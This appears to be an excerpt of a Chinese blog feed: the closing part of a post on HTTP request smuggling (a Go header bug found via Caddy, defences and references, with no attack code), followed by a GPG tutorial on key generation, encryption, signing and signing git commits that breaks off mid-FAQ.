&#x67D0;&#x4E2A;&#x539F;&#x751F;&#x5E93;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x6211;&#x672C;&#x5730;&#x4E5F;&#x5355;&#x72EC;&#x62BD;&#x4E86;&#x5176;&#x4E2D;&#x6709;&#x95EE;&#x9898;&#x7684;&#x4EE3;&#x7801;&#x6D4B;&#x4E86;&#x4E00;&#x904D;&#xFF0C;&#x786E;&#x8BA4;&#x5C31;&#x662F;&#x90A3;&#x4E2A;&#x5E93;&#x7684;&#x539F;&#x56E0;&#x3002;</p><p>&#x5F53;&#x65F6;&#x53EF;&#x5F00;&#x5FC3;&#x4E86;&#xFF0C;&#x8D76;&#x7D27;&#x567C;&#x91CC;&#x556A;&#x5566;&#x641C;&#x7D22;&#x5982;&#x4F55;&#x7ED9; Golang &#x63D0; issue &#xFF0C;&#x7ED3;&#x679C;&#x540E;&#x6765;&#x4ED4;&#x7EC6;&#x5F04;&#x4E86;&#x4E00;&#x4F1A;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x5728; 9&#x6708;27&#x65E5;&#x5DF2;&#x7ECF;&#x88AB;&#x63D0;&#x5230;&#x4E86; <a href="https://github.com/golang/go/issues/34540" target="_blank" rel="noopener">net/http: invalid headers are normalized, allowing request smuggling</a>&#xFF0C;Golang &#x4E5F;&#x5728; 1.13.1 &#x7248;&#x4FEE;&#x590D;&#x4E86;&#x8BE5;&#x95EE;&#x9898;&#x3002;//&#x6094;&#x4E0D;&#x5F53;&#x521D;&#x5E94;&#x8BE5;&#x63D0;&#x65E9;&#x770B;&#x4E00;&#x770B;&#x8FD9;&#x65B9;&#x9762;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x9519;&#x8FC7;&#x4E00;&#x4E2A; CVE /&#x6342;&#x8138;</p><p>&#x7136;&#x540E;&#x6211;&#x4ED4;&#x7EC6;&#x770B;&#x4E86;&#x672C;&#x5730; Golang &#x7248;&#x672C; 1.8.x &#x2026;&#x7136;&#x540E; Caddy &#x7684; issue &#x90AE;&#x4EF6;&#x56DE;&#x590D;&#x4E5F;&#x5230;&#x4E86;&#x2026;&#x4E0D;&#x51FA;&#x6240;&#x6599;&#x8BA9;&#x6211;&#x5347;&#x7EA7; Golang &#x5230; 1.13.1&#xFF0C;<del>&#x770B;&#x4E86;&#x4E00;&#x773C; dockerhub &#x4E0A;&#x7684; caddy &#x6211;&#x5410;&#x4E86;</del></p><p>&#x4F46;&#x662F;&#x76EE;&#x524D;(11/27) dockerhub &#x4E0A;&#x7684; caddy &#x73AF;&#x5883;&#x4ECD;&#x7136;&#x8FD8;&#x662F;&#x6709;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x4F7F;&#x7528;&#x9700;&#x8C28;&#x614E;&#xFF01;</p><h2 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h2><p>hackerone &#x4E0A;&#x5DF2;&#x7ECF;&#x6709;&#x76F8;&#x5173;&#x6F0F;&#x6D1E;&#x7684;&#x62AB;&#x9732;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x63A8;&#x8350;&#x51E0;&#x7BC7;&#x6316;&#x6D1E;&#x5B9E;&#x6218;&#x7684;&#x6587;&#x7AE0;&#xFF1A;</p><p><a href="https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d" target="_blank" rel="noopener">Write up of two HTTP Requests Smuggling</a></p><p><a href="https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html" target="_blank" rel="noopener">HTTP Request Smuggling (CL.TE)</a></p><p><a href="https://hackerone.com/reports/694604" target="_blank" rel="noopener">HTTP Request Smuggling on vpn.lob.com</a></p><h1 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h1><blockquote><p>&#x200B;    &#x4ECE;&#x524D;&#x9762;&#x7684;&#x5927;&#x91CF;&#x6848;&#x4F8B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x4E86;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x7684;&#x5371;&#x5BB3;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x8BE5;&#x5982;&#x4F55;&#x9632;&#x5FA1;&#x5462;&#xFF1F;&#x4E0D;&#x9488;&#x5BF9;&#x7279;&#x5B9A;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x901A;&#x7528;&#x7684;&#x9632;&#x5FA1;&#x63AA;&#x65BD;&#x5927;&#x6982;&#x6709;&#x4E09;&#x79CD;&#x3002;</p><ul><li>&#x7981;&#x7528;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x7684;TCP&#x8FDE;&#x63A5;&#x91CD;&#x7528;&#x3002;</li><li>&#x4F7F;&#x7528;HTTP/2&#x534F;&#x8BAE;&#x3002;</li><li>&#x524D;&#x540E;&#x7AEF;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x670D;&#x52A1;&#x5668;&#x3002;</li></ul><p>&#x4EE5;&#x4E0A;&#x7684;&#x63AA;&#x65BD;&#x6709;&#x7684;&#x4E0D;&#x80FD;&#x4ECE;&#x6839;&#x672C;&#x4E0A;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x800C;&#x4E14;&#x6709;&#x7740;&#x5F88;&#x591A;&#x4E0D;&#x8DB3;&#xFF0C;&#x5C31;&#x6BD4;&#x5982;&#x7981;&#x7528;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x548C;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x7684;TCP&#x8FDE;&#x63A5;&#x91CD;&#x7528;&#xFF0C;&#x4F1A;&#x589E;&#x5927;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x7684;&#x538B;&#x529B;&#x3002;&#x4F7F;&#x7528;HTTP/2&#x5728;&#x73B0;&#x5728;&#x7684;&#x7F51;&#x7EDC;&#x6761;&#x4EF6;&#x4E0B;&#x6839;&#x672C;&#x65E0;&#x6CD5;&#x63A8;&#x5E7F;&#x4F7F;&#x7528;&#xFF0C;&#x54EA;&#x6015;&#x652F;&#x6301;HTTP/2&#x534F;&#x8BAE;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E5F;&#x4F1A;&#x517C;&#x5BB9;HTTP/1.1&#x3002;&#x4ECE;&#x672C;&#x8D28;&#x4E0A;&#x6765;&#x8BF4;&#xFF0C;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x51FA;&#x73B0;&#x7684;&#x539F;&#x56E0;&#x5E76;&#x4E0D;&#x662F;&#x534F;&#x8BAE;&#x8BBE;&#x8BA1;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x800C;&#x662F;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x5668;&#x5B9E;&#x73B0;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x6700;&#x597D;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x5C31;&#x662F;&#x4E25;&#x683C;&#x7684;&#x5B9E;&#x73B0;RFC7230-7235&#x4E2D;&#x6240;&#x89C4;&#x5B9A;&#x7684;&#x7684;&#x6807;&#x51C6;&#xFF0C;&#x4F46;&#x8FD9;&#x4E5F;&#x662F;&#x6700;&#x96BE;&#x505A;&#x5230;&#x7684;&#x3002;</p></blockquote><p>&#x7136;&#x800C;&#x6211;&#x53C2;&#x8003;&#x4E86;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x653B;&#x51FB;&#x6587;&#x7AE0;&#xFF0C;&#x5747;&#x6CA1;&#x6709;&#x63D0;&#x5230;&#x4E3A;&#x4EC0;&#x4E48; HTTP/2 &#x53EF;&#x4EE5;&#x9632;&#x8303; HTTP Smuggling &#xFF0C;&#x539F;&#x4F5C;&#x8005;&#x4E5F;&#x662F;&#x4E00;&#x53E5;&#x8BDD;&#x5E26;&#x8FC7;:</p><blockquote><p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p></blockquote><p>&#x4E4B;&#x540E;&#x6211;&#x53BB;&#x67E5;&#x8BE2;&#x4E86;&#x4E00;&#x4E0B; HTTP/2 &#x4E0E; HTTP/1.1 &#x7684;&#x5DEE;&#x5F02;&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x4E3B;&#x8981;&#x662F; HTTP/2 &#x4E2D;&#x52A0;&#x5165;&#x4E86; Request multiplexing over a single TCP connection &#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x4F7F;&#x7528; HTTP/2 &#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5355;&#x4E2A; TCP &#x8FDE;&#x63A5;&#x6765;&#x8FDB;&#x884C;&#x8BF7;&#x6C42;&#x8D44;&#x6E90;&#xFF0C;&#x4E5F;&#x5C31;&#x51CF;&#x5C11;&#x4E86; TCP &#x8FDE;&#x63A5;&#x590D;&#x7528;&#x7684;&#x53EF;&#x80FD;&#x6027;&#xFF0C;&#x5373;&#x4F7F;&#x80FD; Smuggle &#x4E5F;&#x53EA;&#x80FD;&#x6253;&#x81EA;&#x5DF1;&#xFF1B;&#x800C;&#x4E14;&#x5BF9;&#x4E8E;&#x65B0;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5206;&#x5E27;&#x673A;&#x5236;&#x5F15;&#x5165;&#x4E5F;&#x5BF9;&#x8BE5;&#x79CD;&#x653B;&#x51FB;&#x505A;&#x51FA;&#x4E86;&#x9650;&#x5236;&#x3002;</p><p>&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="[https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5](https://developers.google.com/web/fundamentals/performance/http2">HTTP/2 &#x7B80;&#x4ECB;</a>)</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205225455.png" alt></p><h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>&#x7ECF;&#x8FC7;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x7684;&#x5B66;&#x4E60;&#x7814;&#x7A76;&#xFF0C;&#x81EA;&#x5DF1;&#x4E5F;&#x5C06;&#x4E00;&#x4E9B;&#x76F8;&#x5173;&#x7684;&#x5B9E;&#x9A8C;&#x6574;&#x7406;&#x6210;&#x4E86; docker &#x73AF;&#x5883;&#xFF0C;&#x65B9;&#x4FBF;&#x5927;&#x5BB6;&#x590D;&#x73B0;&#x5B66;&#x4E60;&#xFF1A;<a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab" target="_blank" rel="noopener">HTTP-Smuggling-Lab</a></p><p>&#x73B0;&#x5728;&#x73AF;&#x5883;&#x4E0D;&#x591A;&#xFF0C;&#x6B22;&#x8FCE; star&#xFF0C;&#x540E;&#x9762;&#x6211;&#x4F1A;&#x7EE7;&#x7EED;&#x52A0;&#x5165;&#x66F4;&#x591A;&#x7684;&#x73AF;&#x5883;&#x65B9;&#x4FBF;&#x5927;&#x5BB6;&#x4EE5;&#x767D;&#x76D2;&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x7406;&#x89E3;&#x5B66;&#x4E60;&#xFF0C;<del>&#x5982;&#x679C;&#x6211;&#x6709;&#x65F6;&#x95F4;&#x7684;&#x8BDD;</del></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p><a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">regilero&#x2019;s blog</a></p><p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">&#x534F;&#x8BAE;&#x5C42;&#x7684;&#x653B;&#x51FB;&#x2014;&#x2014;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;</a></p><p><a href="https://github.com/netty/netty/issues/9571" target="_blank" rel="noopener">http request smuggling, cause by obfuscating TE header</a></p><p><a href="https://hackerone.com/reports/648434" target="_blank" rel="noopener">Multiple HTTP Smuggling reports</a></p><p><a href="https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b" target="_blank" rel="noopener">HTTP/2: the difference between HTTP/1.1, benefits and how to use it</a></p>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/gpg/</id>
        <title><![CDATA[GPG使用笔记]]></title>
        <updated>2020-04-02T06:47:31+08:00</updated>
        <link href="https://blog.creedowl.com/posts/gpg/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/gpg/"><![CDATA[<h2 id="why-gpg">Why GPG?</h2>
<p><a href="https://zh.wikipedia.org/wiki/GnuPG">GPG</a> 是一个密码学软件，用于加密、签名通信内容及管理非对称密码学的密钥，具体历史、介绍可以在wiki中看到，<a href="https://gnupg.org/">官网</a></p>
<p>而我使用 GPG 的缘由是，在 Github 上提交时，如果使用 GPG 对提交进行签名，会有一个<code>Verified</code>标识<del>看起来很nb</del></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585795152275.png/compress" alt="UTOOLS1585795152275.png"></p>
<p>当然使用 GPG 不仅是为了好看，它能确保你提供的信息是由你自己发布的，无法被别人篡改、冒充，前提是保护好自己的 GPG 私钥</p>
<h2 id="安装">安装</h2>
<p>这边以 MacOS 为示例进行操作</p>
<p><strong>强烈建议 MacOS 用户使用 <a href="https://gpgtools.org/">GPG Suite</a> 进行操作，可以避免一些奇奇怪怪的问题</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div><p><del>仅安装 GPG 本体</del></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># deprecated</span>
brew install gpg
</code></pre></div><h2 id="生成密钥">生成密钥</h2>
<p>GPG 采用非对称加密，一切的操作都需要有密钥。网上一些教程中的操作与我使用的 GPG 版本 <code>gpg (GnuPG/MacGPG2) 2.2.17</code> 有点出入，以下操作都在我所使用的版本下进行</p>
<p>有两个命令用于生成密钥，为<code>gpg --gen-key</code>和<code>gpg --full-gen-key</code>，区别是前者采用默认的配置不可更改，后者能自定义配置。我们采用后一种，首先选择密钥类型，默认的<code>1</code>就可以了</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ gpg --full-gen-key
gpg <span class="o">(</span>GnuPG/MacGPG2<span class="o">)</span> 2.2.17<span class="p">;</span> Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

请选择您要使用的密钥类型：
   <span class="o">(</span>1<span class="o">)</span> RSA 和 RSA （默认）
   <span class="o">(</span>2<span class="o">)</span> DSA 和 Elgamal
   <span class="o">(</span>3<span class="o">)</span> DSA（仅用于签名）
   <span class="o">(</span>4<span class="o">)</span> RSA（仅用于签名）
您的选择是？ <span class="m">1</span>
</code></pre></div><p>接着选择密钥长度，默认<code>2048</code>即可</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">RSA 密钥的长度应在 1024 位与 4096 位之间。
您想要使用的密钥长度？(2048) 2048
</code></pre></div><p>然后设定密钥的有效期限，我们没有特殊需求，设置永不过期即可</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">请设定这个密钥的有效期限。
         0 = 密钥永不过期
      &lt;n&gt;  = 密钥在 n 天后过期
      &lt;n&gt;w = 密钥在 n 周后过期
      &lt;n&gt;m = 密钥在 n 月后过期
      &lt;n&gt;y = 密钥在 n 年后过期
密钥的有效期限是？(0) 0
</code></pre></div><p>确认上述设置后，依次输入姓名、邮箱和注释，这里我使用随机信息用于演示</p>
<pre><code>GnuPG 需要构建用户标识以辨认您的密钥。

真实姓名： naive
电子邮件地址： naive@test.com
注释： too young too simple
您选定了此用户标识：
    “naive (too young too simple) &lt;naive@test.com&gt;”

更改姓名（N）、注释（C）、电子邮件地址（E）或确定（O）/退出（Q）？
</code></pre>
<p>确定后，需要设定密钥的密码，如果你采用了 <code>GPG Suite</code> ，会出现一个窗口，在此输入密码</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585796741624.png/compress" alt="UTOOLS1585796741624.png"></p>
<p>如果没使用<code>GPG Suite</code>，则会在你当前终端弹出一个全屏终端窗口，同样是输入密码。</p>
<blockquote>
<p>注意，在 mac 终端环境下，如果语言是中文的话，这个终端窗口可能会乱码，但不影响使用，也可以临时设置语言为英文解决这个问题<code>LANGUAGE=en gpg --full-generate-key</code>。但千万不要用<code>ctrl-c</code>结束这个进程，这会破坏当前终端环境，后面的输入会变得很奇怪，而且后台进程不会结束，会占满你的CPU</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘
、移动鼠标、读写硬盘之类的）将会是一个不错的主意；这会让随机数
发生器有更好的机会获得足够的熵。
gpg: 密钥 4C26D2E451FFDAF1 被标记为绝对信任
gpg: 目录‘/Users/creedowl/.gnupg/openpgp-revocs.d’已创建
gpg: 吊销证书已被存储为‘/Users/creedowl/.gnupg/openpgp-revocs.d/0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1.rev’
公钥和私钥已经生成并被签名。

pub   rsa2048 2020-04-02 [SC]
      0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1
uid                      naive (too young too simple) &lt;naive@test.com&gt;
sub   rsa2048 2020-04-02 [E]
</code></pre></div><p>这样，密钥就生成完成，其中<code>4C26D2E451FFDAF1</code>就是你的密钥名，后续操作都需要通过这个密钥名选择密钥，但也可以通过之前设置的姓名或邮箱代替操作</p>
<h2 id="gpg-常用操作">GPG 常用操作</h2>
<p>GPG 最基础的操作就是对文件等信息进行加密、签名，首先创建一个测试文件<code>test.txt</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="nb">test</span> &gt; test.txt
</code></pre></div><h3 id="加密">加密</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --recipient creedowl --output test.txt.gpg --encrypt test.txt
</code></pre></div><p>其中<code>--recipient</code>指定接收者，简写为<code>-r</code>，设定接受者时需要你本地有接收者的<strong>公钥</strong>，可以用密钥名、姓名或者邮箱进行指定。<code>--output</code>指定输出文件名，可省略。<code>--encrypt</code>指定待加密的文件，简写为<code>-e</code>。这样在你当前目录下会生成一个<code>test.txt.gpg</code>即加密后的文件，你就可以把这个文件发送给接受者，不必担心文件内容被第三方读取</p>
<p><strong>注意</strong>这里生成加密文件为二进制格式，有时候（如通过邮件发送）不便于操作，可以加上<code>--armor</code>参数（简写为<code>-a</code>）生成文本格式的密文，如</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -r creedowl -ae test.txt
</code></pre></div><p>生成的加密文件为<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP MESSAGE-----

hQEMA9KmvDhAMTGrAQf+KITqx4HTpWsevIEfRFlw5g+jt8l8ol3fuww0gBoMEPBG
KaqxCmjIpHZdGmaXwBSKadmeieZGLsm1CYuf4gbv4FpdWgveVWnLvB/HmwuvnmJt
YhTtapNgkQ++mwPbH4WKeOFQ58U5dZ7C+R8rrucRRYQBRTH6AJQY82aV1KXTqyF1
D8c/2ANW7aCWr8W/ogCbEqH47VE3foP+aSD+JMPtdnaYWIPzyr5x5lw6ASwxD4hB
ikOUcJTxp+GyFLTd3n1zCvSP9ZQzvolur7soqZVP8t4hxlALGL+KYN4YgubcPt5y
bucMYWkbLlZM+AuAYzSCLaSmkgkiYUFEkwKJWdLr+NJGAY5Mk+bnEP2k/kKxl9vo
/LVsloiYbg9M184LxUNfZRBnKcI9vKw/C6uU2Ee5wKUMsy3Epnp60Fe5u5fj5yn7
0JjMBmY+gQ==
=8K/i
-----END PGP MESSAGE-----
</code></pre></div><h3 id="解密">解密</h3>
<p>有了密文就要对其进行解密得到原文。注意要进行解密，你必须有接受者的<strong>私钥</strong>。公钥是公开的，任何人都可以查看、使用，而<strong>私钥</strong>是私有的，一定要保管好，如果泄露了这个 GPG 密钥就等同于失效了，需要吊销。这就是非对称加密</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">	gpg --decrypt test.txt.asc --output out.txt
</code></pre></div><p>其中<code>--decrypt</code>声明该命令进行解密，简写为<code>-d</code>，<code>--output</code>指定输出文件，默认输出到终端。注意解密时需要输入你密钥的密码，所以也一定要保管好密码</p>
<h3 id="签名">签名</h3>
<p>有的时候不需要对文件进行签名，只需要确保文件是由本人发出的，这个时候就可以用到签名</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --sign test.txt
</code></pre></div><p>会生成二进制的签名文件<code>test.txt.gpg</code>，如果想生成文本类型的签名，使用</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --clearsign test.txt
</code></pre></div><p>会生成文本类型的签名文件<code>test.txt.asc</code></p>
<p>注意以上两种方式原文和签名是在同一个文件中，查看<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
-----BEGIN PGP SIGNATURE-----

iQFDBAEBCAAtFiEECzxS8e8HsU6nxFyaTCbS5FH/2vEFAl6FX+cPHG5haXZlQHRl
c3QuY29tAAoJEEwm0uRR/9rxGNsH/AmjJiT19q5caq9Pe8tMRnR2yvZIGWbMD3Ch
UTkyGMkSPMIo6XRpYPlANe2/dddBT2l7EAPy2lAxaa8LcjsxtRhJG4GxMaCcujik
M6MX3IOfa1m9aDP1IY3Sh2U07j3t+8dawahR8EUF2D+rtvx24ybnwpWpKbDVsGyp
Mt06BI3pWC3opMRYPCl21IBhPhaPPnvXF7X8DMP+2VqZye2juX2oG1KMkZWQuiBb
/D7DYlx6/ainu0cJw6UL8YXHag7tkUeKtTPQbBpCsszOuxJZ74gduIUzDcokayCB
DM9qB/GpUyVOOTwfLMBta6JP5BO8ppPaPdPX46kKDqLKG7eh4bQ=
=Q4/W
-----END PGP SIGNATURE-----
</code></pre></div><p>因为是签名，不会对内容进行加密，所以直接显示原文。如果想把原始文件分离出来，使用</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --output out.txt -d test.txt.gpg
</code></pre></div><p>分离的同时还顺便校验了签名。注意这里<code>test.txt.gpg</code>是上面生成的二进制<strong>签名</strong>文件，也可以用<code>test.txt.asc</code></p>
<p>如果每次都要分离，就很麻烦，而且没有安装 GPG 的用户就无法使用源文件了。所以更好的方式是分离源文件和签名文件</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --detach-sign --armor test.txt
</code></pre></div><p>这样会生成一个单独的、文本类型的签名文件<code>test.txt.sig</code></p>
<blockquote>
<p>注意：如果有多个私钥，可以用<code>-u</code>参数选择</p>
</blockquote>
<h3 id="签名校验">签名校验</h3>
<p>收到文件和签名文件后，需要对签名进行校验</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --verify test.txt.sig test.txt
</code></pre></div><p>如果签名校验成功，会显示</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg: 签名建立于 四  4/ <span class="m">2</span> 11:49:35 <span class="m">2020</span> CST
gpg:               使用 RSA 密钥 34B368EFC6FA8941B4A096CFFA4C884FBE8164D7
gpg: 完好的签名，来自于 “creedowl &lt;creedowl@gmail.com&gt;” <span class="o">[</span>绝对<span class="o">]</span>
</code></pre></div><h3 id="导入导出">导入导出</h3>
<p>当你需要与他人交换数据时，需要导出自己的公钥，同时导入他人的公钥；而如果你更换电脑，就需要导出自己的私钥。这就涉及到了密钥的导入导出</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output public_key.txt --export naive
</code></pre></div><p>上述命令用于导出公钥，相关参数在上文都有介绍。接着你就可以把<code>public_key.txt</code>发布给他人</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output private_key.txt --export-secret-keys naive
</code></pre></div><p>上述命令用于导出私钥，一定要保管好，建议在脱机情况下进行操作</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --improt <span class="o">[</span>密钥文件<span class="o">]</span>
</code></pre></div><p>上述命令用于导入密钥，不区分公钥私钥</p>
<h3 id="查看所有密钥">查看所有密钥</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -k
</code></pre></div><h3 id="生成吊销证书">生成吊销证书</h3>
<p>当你的私钥泄露或者更换时，需要吊销失效的密钥，这时就需要使用吊销证书</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --gen-revoke naive
</code></pre></div><p>接着选择吊销原因，就能生成吊销证书</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">sec  rsa2048/4C26D2E451FFDAF1 2020-04-02 naive (too young too simple) &lt;naive@test.com&gt;

要为这个密钥创建一个吊销证书吗？(y/N) y
请选择吊销的原因：
  0 = 未指定原因
  1 = 密钥已泄漏
  2 = 密钥被替换
  3 = 密钥不再使用
  Q = 取消
（也许您会想要在这里选择 1）
您的决定是什么？ 1
请输入描述（可选）；以空白行结束：
&gt;
吊销原因：密钥已泄漏
（未给定描述）
这样可以吗？ (y/N) y
已强行使用 ASCII 字符封装过的输出。
-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: This is a revocation certificate

****
-----END PGP PUBLIC KEY BLOCK-----
已创建吊销证书。

请把这个文件转移到一个您可以藏起来的介质上；如果坏人获取到了这
份证书的话，那么他就能使用它并让您的密钥无法继续使用。把此证书
打印出来再存放到安全的地方也是很好的方法，以免您的保存媒体变得
不可读。但是千万小心：您机器上的打印系统可能会在打印过程中储存
这些数据，并使得其他人看到！
</code></pre></div><p>只需要保存中间的吊销证书，当密钥泄露时将其发送到公钥服务器，就可以吊销旧密钥</p>
<h3 id="编辑密钥">编辑密钥</h3>
<p>有时候需要对密钥进行编辑，如修改信任度，生成子密钥等，使用以下命令</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --edit-key naive
</code></pre></div><p>接着就会进入交互模式等待命令，输入<code>help</code>可以查看所有操作</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">gpg (GnuPG/MacGPG2) 2.2.17; Copyright (C) 2019 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

私钥可用。

sec  rsa2048/4C26D2E451FFDAF1
     创建于：2020-04-02  有效至：永不       可用于：SC
     信任度：绝对        有效性：绝对
ssb  rsa2048/A86AB46BDC677F8F
     创建于：2020-04-02  有效至：永不       可用于：E
[ 绝对 ] (1). naive (too young too simple) &lt;naive@test.com&gt;

gpg&gt;
</code></pre></div><h2 id="使用-gpg-签名-git-commit">使用 GPG 签名 Git Commit</h2>
<p>这就是我使用 GPG 的原因，下面开始配置，首先配置 git</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># 设置全局默认密钥</span>
git config --global user.signingkey &lt;密钥ID&gt;

<span class="c1"># 设置强制使用GPG签名</span>
git config --global commit.gpgsign <span class="nb">true</span>
</code></pre></div><p>之后在提交时，只需要带上<code>-S</code>参数，就能对提交进行签名</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git commit -S -m <span class="s2">&#34;xxx&#34;</span>
</code></pre></div><p>查看 git 日志时，带上<code>--show-signature</code>参数就能看到签名信息</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git log --show-signature
</code></pre></div><p>最后一步，需要把你的公钥提交到 github，否则它怎么知道这个签名是你的呢？将之前生成的文本类型的公钥<code>public_key.txt</code>提交到 <a href="https://github.com/settings/keys">github</a>，之后你的提交在 github 上就有像开头那样的绿色小勾了</p>
<h2 id="faq">FAQ</h2>
<h3 id="解决git提交时出现error-gpg-failed-to-sign-the-data">解决git提交时出现<code>error: gpg failed to sign the data</code></h3>
<p>以下是原始解决方案，虽然能解决问题，但体验不好，在 IDE 中提交时难以输入密码，建议 MacOS 用户采用上面说的 <code>GPG Suite</code>进行操作，它可以接管密码输入操作，弹出一个独立窗口用于输入，还能将密码添加到 iCloud 钥匙串中，避免重复输入密码。如果你已经在使用<code>GPG Suite</code>，但仍然遇到了这个问题，可以尝试重装<code>GPG Suite</code></p>
<ol>
<li>
<p>导出密钥（私钥）<strong>重要</strong></p>
</li>
<li>
<p>卸载 GPG</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew uninstall gnupg gnutls
   
brew cask uninstall gpg-suite
</code></pre></div></li>
<li>
